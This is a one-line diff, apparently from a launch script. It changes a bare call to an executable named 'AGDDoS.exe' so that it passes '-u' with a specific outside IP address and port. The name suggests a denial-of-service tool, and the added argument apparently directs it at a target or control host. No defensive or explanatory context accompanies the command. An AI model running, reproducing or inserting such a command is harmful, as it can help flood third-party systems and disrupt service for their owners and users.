@@ -1,1 +1,1 @@
-AGDDoS.exe
+AGDDoS.exe -u 82.157.238.143:40373
